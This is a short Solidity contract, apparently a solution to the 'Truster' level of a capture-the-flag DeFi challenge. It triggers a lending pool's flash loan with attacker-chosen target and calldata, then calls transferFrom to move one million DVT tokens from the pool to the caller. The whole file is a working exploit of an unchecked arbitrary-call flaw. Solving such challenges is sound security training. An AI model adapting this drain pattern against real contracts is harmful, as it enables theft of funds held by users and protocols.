// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract AttackTrusterLenderPool {
    TrusterLenderPool pool;
    IERC20 public immutable DVT;

    constructor(address _pool, address _tokenAddress) {
        pool = TrusterLenderPool(_pool);
        DVT = IERC20(_tokenAddress);
    }

    function attack(
        uint256 _amount,
        address _borrower,
        address _target,
        bytes calldata _data
    ) external {
        pool.flashLoan(_amount, _borrower, _target, _data);
        DVT.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}
